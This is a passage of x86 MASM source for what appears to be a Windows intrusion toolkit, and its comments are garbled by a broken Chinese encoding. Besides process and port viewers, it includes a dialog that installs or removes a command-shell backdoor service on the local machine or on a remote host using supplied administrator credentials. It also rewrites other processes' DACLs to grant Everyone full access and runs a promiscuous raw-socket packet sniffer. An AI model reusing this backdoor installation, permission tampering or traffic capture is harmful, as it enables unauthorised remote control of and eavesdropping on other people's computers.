             invoke ShowWindow,hProcessModuleTable,SW_SHOW
             invoke _refreshModuleTable
          .elseif eax==WM_NOTIFY
             invoke GetDlgItem,hProcessModuleDlg,IDC_REFRESHM
             invoke EnableWindow,eax,TRUE
             mov edi,lParam
             assume edi:ptr  PSHNOTIFY
             .if [edi].hdr.code==PSN_APPLY  
                invoke _refreshModuleTable
             .endif
             assume edi:nothing
          .elseif eax==WM_COMMAND
             mov eax,wParam
             .if ax==IDC_REFRESHM  ;ˢ��
                 invoke _refreshModuleTable
             .elseif ax==IDC_MODULELIST  ;��ѡ����ĳһ��ģ���
                 shr eax,16
                 .if ax==LBN_SELCHANGE
                     ;��ʾ��ǰѡ�е�ģ��Ĺ�������
                      invoke _clearModuleView
                      invoke _ModuleNameList,TRUE
                 .endif
             .endif
         .else
             mov eax,FALSE
             ret
         .endif
         mov eax,TRUE
         ret
_ProcModuleMain    endp

_clearPortView  proc uses ebx ecx
             invoke _ListViewClear,hProcessPortTable

             ;��ӱ�ͷ
             mov ebx,1
             mov eax,50
             lea ecx,szPortColName1
             invoke _ListViewAddColumn,hProcessPortTable,ebx,eax,ecx

             mov ebx,2
             mov eax,100
             lea ecx,szPortColName2
             invoke _ListViewAddColumn,hProcessPortTable,ebx,eax,ecx

             mov ebx,3
             mov eax,50
             lea ecx,szPortColName3
             invoke _ListViewAddColumn,hProcessPortTable,ebx,eax,ecx

             mov ebx,4
             mov eax,50
             lea ecx,szPortColName4
             invoke _ListViewAddColumn,hProcessPortTable,ebx,eax,ecx


             mov ebx,5
             mov eax,300
             lea ecx,szPortColName5
             invoke _ListViewAddColumn,hProcessPortTable,ebx,eax,ecx

             mov dwCount,0
             ret
_clearPortView  endp

;--------------------------------
; ����PID��ȡ�������ƺ�·��
; _dwPID��ʾ����ID
;--------------------------------
_getProcessInfoByID proc uses ebx ecx _dwPID
                    local @dwTemp
                    local @hModule[10240]:byte
                    local @needed
                    local @hProcess
                   
                    invoke OpenProcess,PROCESS_QUERY_INFORMATION or PROCESS_VM_READ,\
                           FALSE,_dwPID
                    mov @hProcess,eax

                    invoke EnumProcessModules,@hProcess,addr @hModule,sizeof @hModule,addr @needed
                    mov ebx,dword ptr @hModule
                    invoke GetModuleFileNameEx,@hProcess,ebx,addr szPortProcessPath,\
                                               sizeof szPortProcessPath

                    invoke EnumProcesses,addr @hModule,sizeof @hModule,addr @needed
                    

                    mov esi,offset szPortProcessPath
                    mov edi,offset szPortProcessName
                    ;��ȡ���һ��б�ܵ�λ��
                    .while TRUE
                       mov al,byte ptr [esi]
                       .if al==5Ch
                         mov @dwTemp,esi
                       .endif
                       inc esi
                      .break .if al==0
                    .endw
                    mov esi,@dwTemp
                    inc esi
                    .while TRUE
                       mov al,byte ptr [esi]
                       movsb                       
                       .break .if al==0
                    .endw
                    ret
_getProcessInfoByID endp
;--------------------------------
; ��ȡ����̹����Ķ˿�
; _dwPara1�Ƕ�Ӧ���ڵľ��
;--------------------------------
_getIPPort   proc uses ebx ecx _dwPara1
             local @dwNumBytes
             local @dwNumBytesRet
             local @dwNumEntries
             local @dwPointer,@dwIDPointer  ;������ָ��
             local @dwCount,@dwTemp,@dwTmp,@dwTemp1
             local @dwHandleInfo,@dwOldValue
             local @stWsa:WSADATA
             local @dwHndOffset  ;��ؾ���ڽ����е�ƫ��
             local @dwPID,@dwPort
             local @dwTmp1,@dwTmp2
             local @dwObjectType:byte

             invoke _clearPortView

             mov @dwNumBytes,MAX_HANDLE_LIST_BUF
             invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,@dwNumBytes
             .if eax
                mov pdwHandleList,eax
             .endif

             invoke WSAStartup,0101h,addr @stWsa

             ;����Ӧ�ó���Ȩ��
             invoke GetCurrentProcess
             invoke OpenProcessToken,eax,\
                    TOKEN_QUERY or TOKEN_ADJUST_PRIVILEGES,addr hToken
             invoke LookupPrivilegeValue,NULL,addr process_dpl,\
                    addr process_tkp.Privileges[0].Luid
             mov process_tkp.PrivilegeCount,1
             or process_tkp.Privileges[0].Attributes,SE_PRIVILEGE_ENABLED
             invoke AdjustTokenPrivileges,hToken,FALSE,\
                    addr process_tkp,0,NULL,0
             ;invoke wsprintf,addr szBuffer,addr szOut,eax
             ;invoke MessageBox,NULL,addr szBuffer,NULL,MB_OK

             invoke CloseHandle,hToken

             ;��̬װ��ϵͳ����
             invoke LoadLibrary,addr lpszNTDll
             invoke GetProcAddress,eax,addr lpszDllMethodName
             mov lpQuerySysInfo,eax
             mov @dwNumBytesRet,0
             invoke lpQuerySysInfo,NT_HANDLE_LIST,\
                    pdwHandleList,@dwNumBytes,addr @dwNumBytesRet

             ;���о���������ĵ�һ��˫���Ǿ��������������ŵľ���HANDLEINFO���ݽṹ
             mov esi,pdwHandleList
             mov eax,dword ptr [esi]
             mov @dwNumEntries,eax

             ;���̱�־
             mov @dwIDPointer,4  ;���������ֽ���֮����
             mov @dwPointer,8
             mov @dwCount,0
             
             mov @dwTmp,16
             mov @dwOldValue,0

             .while TRUE
               fild pdwHandleList
               fild @dwPointer
               fadd
               fistp @dwTemp
               mov esi,@dwTemp  ;��ʼλ��
 
               ;�жϲ���ϵͳ����,�����2K,����TRUE
               invoke RtlZeroMemory,addr osVersion,sizeof OSVERSIONINFO
               mov osVersion.dwOSVersionInfoSize,sizeof OSVERSIONINFO
               invoke GetVersionEx,addr osVersion
               .if osVersion.dwMajorVersion==5 && osVersion.dwMinorVersion==0  ;2000
                 mov @dwObjectType,OBJECT_TYPE_SOCKET_2K
               .elseif osVersion.dwMajorVersion==5 && osVersion.dwMinorVersion==1  ;xp
                 mov @dwObjectType,OBJECT_TYPE_SOCKET_XP
               .elseif osVersion.dwMajorVersion==5 && osVersion.dwMinorVersion==2  ;2003/xp 64
                 mov @dwObjectType,OBJECT_TYPE_SOCKET_2003
               .elseif osVersion.dwMajorVersion==6 && osVersion.dwMinorVersion==0  ;longhorn/vista
                 mov @dwObjectType,OBJECT_TYPE_SOCKET_VISTA
               .endif

               mov al,byte ptr [esi]

               .if al==@dwObjectType
                  inc @dwCount


                  ;��ȡ���̺�
                  mov eax,4
                  sub @dwTemp,eax
                  mov esi,@dwTemp
                  movzx eax,word ptr [esi]
                  mov @dwPID,eax

                  ;��ȡ����ڽ��̵�ƫ��
                  mov eax,6
                  add @dwTemp,eax
                  mov esi,@dwTemp
                  movzx eax,word ptr [esi]
                  mov @dwHndOffset,eax

                  mov eax,2
                  sub @dwTemp,eax

                  invoke GetCurrentProcess
                  mov hCurrentProcess,eax

                  ;����Ŀ����̵�DACL
                  ;��ʹadministrator�û����Զ�д�ý��������ڴ��ֵ

                  invoke OpenProcess,WRITE_DAC,FALSE,@dwPID
                  mov hProcessPort,eax


                  mov world.Revision,SID_REVISION
                  mov world.SubAuthorityCount,1
                  mov world.IdentifierAuthority.Value[0],0
                  mov world.IdentifierAuthority.Value[1],0
                  mov world.IdentifierAuthority.Value[2],0
                  mov world.IdentifierAuthority.Value[3],0
                  mov world.IdentifierAuthority.Value[4],0
                  mov world.IdentifierAuthority.Value[5],1
                  mov world.SubAuthority,0

                  invoke RtlZeroMemory,addr ea,sizeof EXPLICIT_ACCESS
                  mov ea.grfAccessPermissions,STANDARD_RIGHTS_ALL or SPECIFIC_RIGHTS_ALL
                  mov ea.grfAccessMode,SET_ACCESS
                  mov ea.grfInheritance,NO_INHERITANCE
                  mov ea.Trustee.pMultipleTrustee,0
                  mov ea.Trustee.MultipleTrusteeOperation,NO_MULTIPLE_TRUSTEE
                  mov ea.Trustee.TrusteeForm,TRUSTEE_IS_SID
                  mov ea.Trustee.TrusteeType,TRUSTEE_IS_USER
                  mov ea.Trustee.ptstrName,offset world

                  invoke SetEntriesInAcl,1,addr ea,0,addr pDacl
                  .if eax!=ERROR_SUCCESS
                     ;ע�ⷽ��SetEntriesInAcl,1,addr ea,0,addr pDacl�е�pDacl��ָ��ACL��һ��ָ����������ֱ�Ӷ����ACL���򷵻�1336����
                     invoke wsprintf,addr szBuffer,addr szOut,eax  ;����1336�����Ϸ���ERROR_INVALID_ACL
                     invoke MessageBox,NULL,addr szBuffer,NULL,MB_OK
                  .endif

                  invoke SetSecurityInfo,hProcessPort,SE_KERNEL_OBJECT,\
                                    DACL_SECURITY_INFORMATION,0,0,pDacl,0
                  .if eax!=ERROR_SUCCESS
                     ;ע�ⷽ��SetEntriesInAcl,1,addr ea,0,addr pDacl�е�pDacl��ָ��ACL��һ��ָ����������ֱ�Ӷ����ACL���򷵻�1336����
                     ;invoke wsprintf,addr szBuffer,addr szOut,eax  ;����1336�����Ϸ���ERROR_INVALID_ACL
                     ;invoke MessageBox,NULL,addr szBuffer,NULL,MB_OK
                  .endif
                  invoke CloseHandle,hProcessPort
                  invoke LocalFree,pDacl

                  ;��Ŀ�����
                  invoke OpenProcess,PROCESS_DUP_HANDLE,TRUE,@dwPID
                  .if eax==INVALID_HANDLE_VALUE
                     ;invoke wsprintf,addr szBuffer,addr szOut,eax
                     ;invoke MessageBox,NULL,addr szBuffer,NULL,MB_OK
                  .else
                     mov hProcessPort,eax                 
                  .endif

                  ;���̾��ת��
                  invoke DuplicateHandle,hProcessPort,@dwHndOffset,\
                                  hCurrentProcess,addr hMyHandle,\
                                  STANDARD_RIGHTS_REQUIRED,TRUE,0
                  invoke CloseHandle,hProcessPort
                  .if hMyHandle!=0   ;ת���ɹ�
                     invoke RtlZeroMemory,addr sockAddrName,sizeof sockaddr_in
                     mov sockAddrName.sin_family,AF_INET
                     mov dwSockLen,sizeof sockaddr_in
                     invoke getsockname,hMyHandle,addr sockAddrName,addr dwSockLen  ;����ע�ⳤ�ȵĴ���ʹ�õ�ַ
                     .if eax!=SOCKET_ERROR
                         invoke getsockopt,hMyHandle,SOL_SOCKET,SO_TYPE,addr sockType,addr optlen  
                         .if eax==0  ;ִ�гɹ�
                           inc @dwOldValue
                         .endif
                         movzx edx,word ptr [sockType]   
                         mov @dwTmp1,edx                     ;SOCK����
                         movzx eax,sockAddrName.sin_port
                         invoke ntohs,eax
                         mov @dwPort,eax                     ;�˿�

                         mov @dwTmp2,4
                         fild @dwTmp1
                         fild @dwTmp2
                         fmul
                         fistp @dwTemp1

                         mov esi,offset szSockType
                         add esi,@dwTemp1
                         mov edi,offset szSockAscii
                         mov ecx,4
                         rep movsb
                         mov byte ptr [edi],0
                        
                         invoke RtlZeroMemory,addr szPortPID,10
                         invoke RtlZeroMemory,addr szPort,10

                         invoke wsprintf,addr szPortPID,addr szOut,@dwPID
                         invoke wsprintf,addr szPort,addr szOut,@dwPort

                         invoke GetCurrentProcessId
                         .if eax!=@dwPID   ;���Ȿ�����о��ظ�

                           invoke _getProcessInfoByID,@dwPID

                           ;����һ��
                           invoke _ListViewSetItem,hProcessPortTable,dwCount,-1,\
                                addr szBuffer
                           mov dwCount,eax

                           xor ebx,ebx
                           invoke _ListViewSetItem,hProcessPortTable,dwCount,ebx,\
                                 addr szPortPID
                           inc ebx
                           invoke _ListViewSetItem,hProcessPortTable,dwCount,ebx,\
                                 addr szPortProcessName
                           inc ebx
                           invoke _ListViewSetItem,hProcessPortTable,dwCount,ebx,\
                                addr szPort
                           inc ebx
                           invoke _ListViewSetItem,hProcessPortTable,dwCount,ebx,\
                                 addr szSockAscii
                           inc ebx
                           invoke _ListViewSetItem,hProcessPortTable,dwCount,ebx,\
                                 addr szPortProcessPath
                           inc dwCount
                         .endif
                      .endif
                  .else
                     invoke Sleep,0
                  .endif
               .endif
               mov eax,sizeof HANDLEINFO
               add @dwPointer,eax

               dec @dwNumEntries
               .break .if @dwNumEntries==0
             .endw
             invoke GlobalFree,addr pdwHandleList
             .if hCurrentProcess
                invoke CloseHandle,hCurrentProcess
             .endif
             ret
_getIPPort   endp

;--------------------------
; ���̹���-������˿ڹ���֮���ڳ���
;--------------------------
_ProcIPPortMain   proc  uses ebx edi esi hProcessPortDlg:HWND,wMsg,wParam,lParam
          mov eax,wMsg

          .if eax==WM_CLOSE
             invoke EndDialog,hProcessPortDlg,NULL
          .elseif eax==WM_INITDIALOG
             invoke GetDlgItem,hProcessPortDlg,IDC_PORTTABLE
             mov hProcessPortTable,eax
             invoke SendMessage,hProcessPortTable,LVM_SETEXTENDEDLISTVIEWSTYLE,\
                    0,LVS_EX_GRIDLINES or LVS_EX_FULLROWSELECT
             invoke ShowWindow,hProcessPortTable,SW_SHOW

             invoke _getIPPort,hProcessPortDlg
          .elseif eax==WM_COMMAND
             mov eax,wParam
             .if ax==IDC_CLOSEPORT  ;�رմ���
                ;invoke _GetListViewItem,hProcessWinTable,dwTopWinLineIndex,1,\
                ;        addr szClassNameBuf
                ;invoke _GetListViewItem,hProcessWinTable,dwTopWinLineIndex,2,\
                ;        addr szWndTextBuf
                ;invoke FindWindow,addr szClassNameBuf,addr szWndTextBuf
                ;invoke PostMessage,eax,WM_CLOSE,0,0
             .elseif ax==IDC_PORTOFF  ;�Ͽ�ѡ����sock
                ;invoke _GetListViewItem,hProcessWinTable,dwTopWinLineIndex,1,\
                ;        addr szClassNameBuf
                ;invoke _GetListViewItem,hProcessWinTable,dwTopWinLineIndex,2,\
                ;        addr szWndTextBuf
                ;invoke FindWindow,addr szClassNameBuf,addr szWndTextBuf
                ;invoke ShowWindow,eax,SW_RESTORE
             .elseif ax==IDC_REFRESHPORT  ;ˢ����ʾ
                invoke _getIPPort,hProcessPortDlg
             .endif
         .elseif eax==WM_NOTIFY   ;����ؼ������ĸ���֪ͨ��
            mov eax,lParam
            mov ebx,lParam
            ;���ĸ��ؼ�״̬
            mov eax,[eax+NMHDR.hwndFrom]
            .if eax==hProcessPortTable
                mov ebx,lParam
                .if [ebx+NMHDR.code]==NM_CLICK  ;������
                    assume ebx:ptr NMLISTVIEW
                    mov eax,[ebx].iItem
                    mov dwPortLineIndex,eax
                .endif
            .endif
         .else
             mov eax,FALSE
             ret
         .endif
         mov eax,TRUE
         ret
_ProcIPPortMain    endp

;--------------------------
; ���繤��-TELNET����֮���ڳ���
;--------------------------
_ProcTelnetMain   proc  uses ebx edi esi hProcessTelnetDlg:HWND,wMsg,wParam,lParam
          mov eax,wMsg

          .if eax==WM_CLOSE
             invoke EndDialog,hProcessTelnetDlg,NULL
          .elseif eax==WM_INITDIALOG
             ;��ʼ��Զ����������
             invoke SetDlgItemText,hProcessTelnetDlg,IDC_REMOTEIP,addr lpszDestHost
             invoke SetDlgItemText,hProcessTelnetDlg,IDC_REMOTEPORT,addr lpszDestPort
             invoke SetDlgItemText,hProcessTelnetDlg,IDC_REMOTEUSER,addr lpszAdminUser
             invoke SetDlgItemText,hProcessTelnetDlg,IDC_REMOTEPASS,addr lpszAdminPass

             mov eax,hProcessTelnetDlg
             mov hTelnetDlg,eax
       
             ;Ĭ��Ϊ��һ�˿ڣ�һ��˿ڻһ�
             invoke CheckDlgButton,hTelnetDlg,IDC_LOCALHOST,BST_CHECKED

             invoke GetDlgItem,hTelnetDlg,IDC_REMOTEIP
             invoke EnableWindow,eax,FALSE

             invoke GetDlgItem,hTelnetDlg,IDC_REMOTEPORT
             invoke EnableWindow,eax,FALSE

             invoke GetDlgItem,hTelnetDlg,IDC_REMOTEUSER
             invoke EnableWindow,eax,FALSE

             invoke GetDlgItem,hTelnetDlg,IDC_REMOTEPASS
             invoke EnableWindow,eax,FALSE

          .elseif eax==WM_COMMAND
             mov eax,wParam
             .if ax==IDC_INSTALLBACKDOOR  ;��װ����
               invoke RtlZeroMemory,addr dispatchTable,sizeof dispatchTable
               mov esi,offset dispatchTable
               assume esi:ptr SERVICE_TABLE_ENTRY
               mov [esi].lpServiceName,offset lpszServiceName
               mov [esi].lpServiceProc,offset _cmdStart
               assume esi:nothing

               invoke GetDlgItemText,hTelnetDlg,IDC_REMOTEIP,addr lpszDestHost,15
               invoke GetDlgItemInt,hTelnetDlg,IDC_REMOTEPORT,NULL,FALSE
               mov dwTelnetPort,eax
               invoke GetDlgItemText,hTelnetDlg,IDC_REMOTEUSER,addr lpszAdminUser,50
               invoke GetDlgItemText,hTelnetDlg,IDC_REMOTEPASS,addr lpszAdminPass,50
               invoke IsDlgButtonChecked,hTelnetDlg,IDC_LOCALHOST
               ;�ڱ��ذ�װ
               .if eax==BST_CHECKED  ;�򱾵������ͷź��ų���
                 invoke _installCmdService,NULL  
               .else                 ;�����������ϰ�װ
                 invoke _connectRemote,TRUE,addr lpszDestHost,\
                        addr lpszAdminUser,addr lpszAdminPass
                 invoke _installCmdService,addr lpszDestHost  ;��Զ�������ͷź��ų���
               .endif
               invoke StartServiceCtrlDispatcher,addr dispatchTable
             .elseif ax==IDC_REMOVEBACKDOOR  ;ж�غ���
               invoke RtlZeroMemory,addr dispatchTable,sizeof dispatchTable
               mov esi,offset dispatchTable
               assume esi:ptr SERVICE_TABLE_ENTRY
               mov [esi].lpServiceName,offset lpszServiceName
               mov [esi].lpServiceProc,offset _cmdStart
               assume esi:nothing

               invoke GetDlgItemText,hTelnetDlg,IDC_REMOTEIP,addr lpszDestHost,15
               invoke GetDlgItemInt,hTelnetDlg,IDC_REMOTEPORT,NULL,FALSE
               mov dwTelnetPort,eax
               invoke GetDlgItemText,hTelnetDlg,IDC_REMOTEUSER,addr lpszAdminUser,50
               invoke GetDlgItemText,hTelnetDlg,IDC_REMOTEPASS,addr lpszAdminPass,50

               invoke IsDlgButtonChecked,hTelnetDlg,IDC_LOCALHOST
               .if eax==BST_CHECKED             ;ж�ر��غ��ų���
                 invoke _removeCmdService,NULL  
               .else                            ;ж�����������Ϻ��ų���
                 invoke _connectRemote,TRUE,addr lpszDestHost,\
                        addr lpszAdminUser,addr lpszAdminPass
                 invoke _removeCmdService,addr lpszDestHost  ;��Զ�������ͷź��ų���
               .endif
               invoke StartServiceCtrlDispatcher,addr dispatchTable
             .elseif ax==IDC_LOCALHOST  ;�����˱���
               invoke GetDlgItem,hTelnetDlg,IDC_REMOTEIP
               invoke EnableWindow,eax,FALSE
               invoke GetDlgItem,hTelnetDlg,IDC_REMOTEPORT
               invoke EnableWindow,eax,FALSE
               invoke GetDlgItem,hTelnetDlg,IDC_REMOTEUSER
               invoke EnableWindow,eax,FALSE
               invoke GetDlgItem,hTelnetDlg,IDC_REMOTEPASS
               invoke EnableWindow,eax,FALSE
             .elseif ax==IDC_REMOTEHOST  ;������Զ������
               invoke GetDlgItem,hTelnetDlg,IDC_REMOTEIP
               invoke EnableWindow,eax,TRUE
               invoke GetDlgItem,hTelnetDlg,IDC_REMOTEPORT
               invoke EnableWindow,eax,TRUE
               invoke GetDlgItem,hTelnetDlg,IDC_REMOTEUSER
               invoke EnableWindow,eax,TRUE
               invoke GetDlgItem,hTelnetDlg,IDC_REMOTEPASS
               invoke EnableWindow,eax,TRUE
             .endif
         .else
             mov eax,FALSE
             ret
         .endif
         mov eax,TRUE
         ret
_ProcTelnetMain    endp


_clearFilterView  proc uses ebx ecx
            invoke _ListViewClear,hHttpFilterTable
            ;��ӱ�ͷ
            mov ebx,1
            mov eax,80
            lea ecx,lpszFilterCol1

            invoke _ListViewAddColumn,hHttpFilterTable,ebx,eax,ecx

            mov ebx,2
            mov eax,100
            lea ecx,lpszFilterCol2

            invoke _ListViewAddColumn,hHttpFilterTable,ebx,eax,ecx

            mov ebx,3
            mov eax,190
            lea ecx,lpszFilterCol3
            invoke _ListViewAddColumn,hHttpFilterTable,ebx,eax,ecx

            mov ebx,4
            mov eax,190
            lea ecx,lpszFilterCol4
            invoke _ListViewAddColumn,hHttpFilterTable,ebx,eax,ecx

            mov ebx,5
            mov eax,80
            lea ecx,lpszFilterCol5
            invoke _ListViewAddColumn,hHttpFilterTable,ebx,eax,ecx

            mov ebx,6
            mov eax,75
            lea ecx,lpszFilterCol6
            invoke _ListViewAddColumn,hHttpFilterTable,ebx,eax,ecx

            mov dwCount,0
            ret
_clearFilterView  endp



_stopCapture   proc _lParam
     invoke WSACleanup
     invoke CloseHandle,hHttpFilterFile
     mov dwFilterStarted,0
     invoke SetDlgItemText,_lParam,IDC_STARTCAPTURE,addr lpszFilterStart
     ret
_stopCapture   endp


;------------------------------------------
; ������������д���ļ���ע��
;------------------------------------------
_writeBufferToFile   proc  _hFile,_lpBuffer
         local @dwSize
         local @dwTemp
         local @stST1:SYSTEMTIME

         pushf         
         ;����д�뵱ǰʱ��
         invoke RtlZeroMemory,addr @stST1,sizeof SYSTEMTIME
         invoke RtlZeroMemory,addr szBuffer,100
         invoke GetLocalTime,addr @stST1
         movzx edx,@stST1.wYear
         movzx esi,@stST1.wMonth
         movzx edi,@stST1.wDay
         movzx eax,@stST1.wHour
         movzx ebx,@stST1.wMinute
         movzx ecx,@stST1.wSecond
         invoke wsprintf,addr szBuffer,addr lpszHttpFilterFmt,\
                         edx,esi,edi,eax,ebx,ecx
         invoke lstrlen,addr szBuffer
         mov @dwSize,eax
         invoke WriteFile,_hFile,addr szBuffer,@dwSize,addr @dwTemp,NULL
         ;д������
         invoke lstrlen,_lpBuffer
         mov @dwSize,eax
         invoke WriteFile,_hFile,_lpBuffer,@dwSize,addr @dwTemp,NULL

         ;�س�����
         mov @dwSize,2
         invoke WriteFile,_hFile,addr lpszReturn,@dwSize,addr @dwTemp,NULL

         popf
         ret
_writeBufferToFile   endp

;------------------------
; ������¼���ݰ�����
;------------------------
_ipFilterReceive  proc  uses ebx esi edi _lParam
            local @stFdSet:fd_set
            local @stTimeval:timeval
            local @line
            local @dwLen
            local @dwSourceIP

            invoke inet_addr,addr lpszLocalIP
            mov @dwSourceIP,eax
            .while TRUE
             .break .if !dwFilterStarted
             .if !bStopRecvPacket
                ;�������ݰ�
                invoke recv,hRecvSocket,addr recvBuffer,sizeof recv_tcp,0
                mov @dwLen,eax
                ;���ݰ��а�������               
                .if @dwLen>0
                     ;��������1
                     mov eax,dwReceivePackets
                     inc eax
                     invoke SetDlgItemInt,_lParam,IDC_TOTALRECEIVED,\
                         eax,FALSE
                     ;��λд������ָ�룬��������������������´ӻ�����ͷ����ʼ��串��ԭ��������
                     mov eax,@dwLen
                     add eax,lpBufferWrite
                     .if eax>lpMaxEndBuffer  ;����������������ֹͣ
                         invoke _stopCapture,_lParam
                         .break 
                     .endif
                     ;�������Ƶ�������
                     invoke MemCopy,addr recvBuffer,lpBufferWrite,@dwLen
                     inc dwReceivePackets
                     mov eax,@dwLen
                     add eax,lpBufferWrite
                     mov lpBufferWrite,eax
                     mov dwCurrentFilterProValue,eax
                     invoke SendDlgItemMessage,_lParam,IDC_BUFFERPROCESS,\
                           PBM_SETPOS,dwCurrentFilterProValue,0
                .endif
              .endif
            .endw
            ret
_ipFilterReceive  endp

;-------------------------
; ������¼���ݰ�����
;-------------------------
_ipFilterDeal  proc  uses ebx esi edi _lParam
         local @dwTemp,@dwTemp1,@dwTemp2,@dwTemp3
         local @dwLen,@dwOff,@flag
         local @bufTemp[2000]:byte
         local @bufTemp1[1500]:byte
         local @bufPara[1500]:byte

         local @srcIP[20]:byte ;Դ��ַ
         local @dstIP[20]:byte ;Ŀ�ĵ�ַ
         local @srcPort,@dstPort  ;Դ��Ŀ�Ķ˿�
         local @currentTime[20]:byte       ;ʱ��14:23:32  999 
         local @type[4]:byte  ;����       0��ʾTCP��1��ʾUDP
         local @packetLen   ;����         
         local @lpIP
         local @stST1:SYSTEMTIME
         local @source[30]:byte
         local @dest[30]:byte
    
         .while TRUE
           .break .if !dwFilterStarted

           ;����������ݰ�����С�ڽ��յ����ݰ�����ʱ������������������������1ms
           mov eax,dwReceivePackets
           .if dwDealedPackets<eax
             invoke SetDlgItemInt,_lParam,IDC_TOTALDEALED,\
                    eax,FALSE
             mov esi,lpBufferRead
             assume esi:ptr send_ip
             movzx eax,[esi].ip.ip_len
             invoke ntohs,eax
             mov @dwLen,eax
             mov @packetLen,eax

             invoke RtlZeroMemory,addr @srcIP,20
             invoke RtlZeroMemory,addr @dstIP,20
             mov eax,[esi].ip.ip_src
             invoke inet_ntoa,eax
             mov @lpIP,eax
             invoke lstrlen,@lpIP
             invoke MemCopy,@lpIP,addr @srcIP,eax

             mov eax,[esi].ip.ip_dest
             invoke inet_ntoa,eax
             mov @lpIP,eax
             invoke lstrlen,@lpIP
             invoke MemCopy,@lpIP,addr @dstIP,eax

             movzx eax,[esi].tcp.source
             invoke ntohs,eax
             mov @srcPort,eax

             movzx eax,[esi].tcp.dest
             invoke ntohs,eax
             mov @dstPort,eax

             invoke RtlZeroMemory,addr @source,30
             invoke RtlZeroMemory,addr @dest,30
             invoke wsprintf,addr @source,addr lpszIPFilterFmt1,\
                    addr @srcIP,@srcPort
             invoke wsprintf,addr @dest,addr lpszIPFilterFmt1,\
                    addr @dstIP,@dstPort


             xor eax,eax
             mov al ,[esi].ip.ip_p
             .if al==6  ;ΪTCP
               invoke lstrlen,addr lpszTCP
               invoke MemCopy,addr lpszTCP,addr @type,eax
             .else  ;17ΪUDP
               invoke lstrlen,addr lpszUDP
               invoke MemCopy,addr lpszUDP,addr @type,eax
             .endif


             invoke RtlZeroMemory,addr @stST1,sizeof SYSTEMTIME
             invoke RtlZeroMemory,addr szBuffer,100
             invoke GetLocalTime,addr @stST1
             movzx eax,@stST1.wHour
             movzx ebx,@stST1.wMinute
             movzx ecx,@stST1.wSecond
             movzx edx,@stST1.wMilliseconds

             invoke wsprintf,addr szBuffer,addr lpszIPFilterFmt,\
                         eax,ebx,ecx,edx
             invoke lstrlen,addr szBuffer
             invoke MemCopy,addr szBuffer,addr @currentTime,eax

             xor edx,edx
             mov eax,dwDealedPackets
             mov ecx,4
             mul ecx
             add eax,lpMaxDWBuffer
             mov edi,eax
             mov eax,lpBufferRead
             mov dword ptr [edi],eax

             inc dwDealedPackets

             ;����һ��
            
             invoke _ListViewSetItem,hHttpFilterTable,dwCount,-1,\
                    addr szBuffer
             mov dwCount,eax
             invoke RtlZeroMemory,addr szBuffer,50
             invoke wsprintf,addr szBuffer,addr szOut,dwDealedPackets
             xor ebx,ebx
             invoke _ListViewSetItem,hHttpFilterTable,dwCount,ebx,\
                   addr szBuffer
             inc ebx
             invoke _ListViewSetItem,hHttpFilterTable,dwCount,ebx,\
                   addr @currentTime
             inc ebx
             invoke _ListViewSetItem,hHttpFilterTable,dwCount,ebx,\
                    addr @source
             inc ebx
             invoke _ListViewSetItem,hHttpFilterTable,dwCount,ebx,\
                    addr @dest

             invoke RtlZeroMemory,addr szBuffer,50
             invoke wsprintf,addr szBuffer,addr szOut,@packetLen
             inc ebx
             invoke _ListViewSetItem,hHttpFilterTable,dwCount,ebx,\
                   addr szBuffer

             inc ebx
             invoke _ListViewSetItem,hHttpFilterTable,dwCount,ebx,\
                    addr @type

             assume esi:nothing

             mov eax,@dwLen
             add lpBufferRead,eax   
           .else
             invoke Sleep,1
           .endif
         .endw
         ret
_ipFilterDeal  endp

;---------------------------
; ����IP���ݰ���׽
;---------------------------
_ipFilter  proc  uses esi edi ebx _dwParam
            local @addrLocal:sockaddr_in
            local @dwSourceIP
            local @dwValue
            local @dwThreadID
            local @stWsa:WSADATA
            local @dwFlag


            mov @dwFlag,TRUE
            mov @dwValue,1   ;Ϊ1ʱִ��

            ;����30M�ڴ�
            invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,MAX_BUFFER_SIZE
            .if eax
               mov lpMaxBuffer,eax
            .else
               invoke showERR,addr lpszErrNoMemory
               ret
            .endif

            invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,MAX_DWBUFFER_SIZE
            .if eax
               mov lpMaxDWBuffer,eax
            .else
               invoke showERR,addr lpszErrNoMemory
               ret
            .endif


            invoke WSAStartup,0202h,addr @stWsa
            invoke _getLocalIP
            invoke inet_addr,addr lpszLocalIP
            mov @dwSourceIP,eax

            ;����������
            invoke socket,AF_INET,SOCK_RAW,IPPROTO_IP
            mov hRecvSocket,eax
            .if eax==INVALID_SOCKET
                invoke WSAGetLastError
                invoke wsprintf,addr szBuffer,addr szOut,eax
                invoke MessageBox,NULL,addr szBuffer,NULL,MB_OK
            .endif

            ;�Լ����IP��ͷ
            invoke setsockopt,hRecvSocket,IPPROTO_IP,IP_HDRINCL,addr @dwFlag,sizeof @dwFlag
            .if eax==SOCKET_ERROR
               invoke wsprintf,addr szBuffer,addr szOut,eax
               invoke MessageBox,NULL,addr lpszOne,NULL,MB_OK
            .endif

            invoke htons,dwHttpFilterBindingPort
            mov @addrLocal.sin_port,ax
            mov @addrLocal.sin_family,AF_INET
            mov eax,@dwSourceIP
            mov @addrLocal.sin_addr.S_un.S_addr,eax

            invoke bind,hRecvSocket,addr @addrLocal,sizeof sockaddr_in ;�� sockRaw �󶨵�����������
            .if eax==SOCKET_ERROR
                invoke WSAGetLastError
                invoke wsprintf,addr szBuffer,addr szOut,eax
                invoke MessageBox,NULL,addr szBuffer,NULL,MB_OK
            .endif

            invoke ioctlsocket,hRecvSocket,SIO_RCVALL,addr @dwValue  ;�� sockRaw �������е�����
            .if eax
                invoke WSAGetLastError
                invoke wsprintf,addr szBuffer,addr szOut,eax
                invoke MessageBox,NULL,addr szBuffer,NULL,MB_OK
            .endif

            ;��ʼ����д���ݰ�ʹ�õı���
            mov dwDealedPackets,0
            mov dwReceivePackets,0
            mov eax,lpMaxBuffer     ;��������ʼλ��
            mov lpBufferWrite,eax   ;д������ָ��
            mov lpBufferRead,eax    ;��������ָ��
            add eax,MAX_BUFFER_SIZE
            add lpMaxEndBuffer,eax  ;����������λ��

            mov eax,lpMaxBuffer
            mov dwFilterProgressMin,eax
            mov eax,lpMaxEndBuffer
            mov dwFilterProgressMax,eax

            mov eax,lpMaxBuffer
            mov dwCurrentFilterProValue,eax
            invoke SendDlgItemMessage,_dwParam,IDC_BUFFERPROCESS,\
                      PBM_SETRANGE32,lpMaxBuffer,dwFilterProgressMax
